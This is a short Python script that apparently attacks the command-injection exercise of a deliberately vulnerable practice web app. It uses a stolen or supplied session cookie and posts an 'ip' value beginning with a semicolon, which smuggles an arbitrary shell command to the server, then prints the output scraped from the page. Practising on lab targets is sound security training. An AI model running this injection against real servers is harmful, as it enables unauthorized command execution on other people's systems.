import requests
from bs4 import BeautifulSoup

# Define target 
target = "INSERT YOUR TARGET"

# Define cookies
cookies = { 'PHPSESSID': 'INSERT YOUR PHPSESSID', 'security': 'low' }

# Define payload
payload = "; INSERT YOUR PAYLOAD"

# POST Request
output = requests.post(target, data={ 'ip': payload, 'Submit': 'Submit' }, cookies=cookies)

# Extract command output from html response
soup = BeautifulSoup(output.text, 'html.parser')

command_output = soup.find('div', { 'class': 'vulnerable_code_area' }).find('pre')

print(command_output)